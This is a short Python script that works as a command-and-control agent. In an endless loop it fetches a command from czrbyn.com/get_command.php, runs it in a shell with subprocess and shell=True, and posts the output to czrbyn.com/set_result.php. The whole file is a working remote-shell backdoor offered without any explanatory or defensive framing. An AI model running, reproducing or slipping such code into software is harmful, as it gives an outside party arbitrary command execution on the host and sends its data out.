import time
import requests
import subprocess

LAST_COMMAND = ""

def fetch_command():
    try:
        response = requests.get('https://czrbyn.com/get_command.php')
        return response.text.strip()
    except Exception as e:
        print("Error fetching command:", e)
        return None

def send_result(result):
    try:
        requests.post('https://czrbyn.com/set_result.php', data={'result': result})
    except Exception as e:
        print("Error sending result:", e)

while True:
    command = fetch_command()
    if command and command != LAST_COMMAND:
        LAST_COMMAND = command
        print(f"> Running: {command}")
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        except subprocess.CalledProcessError as e:
            result = e.output
        print(result)
        send_result(result)
    time.sleep(3)
